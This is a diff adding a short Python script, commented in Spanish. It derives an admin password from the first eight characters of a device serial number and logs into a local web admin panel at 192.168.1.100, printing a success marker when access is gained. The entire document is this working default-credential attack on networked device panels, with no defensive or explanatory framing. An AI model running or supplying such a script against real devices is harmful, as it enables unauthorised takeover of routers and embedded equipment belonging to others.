@@ -1,0 +1,17 @@
+import requests
+
+# Número de serie conocido o detectado
+serial = "E74847F1J123456"
+password = serial[:8]  # Ejemplo de esquema común
+
+# Autenticación básica en panel web
+session = requests.Session()
+login = session.post("http://192.168.1.100/login", data={
+    "username": "admin",
+    "password": password
+})
+
+if "Dashboard" in login.text:
+    print("[+] Acceso exitoso como admin")
+else:
+    print("[-] Fallo en autenticación")
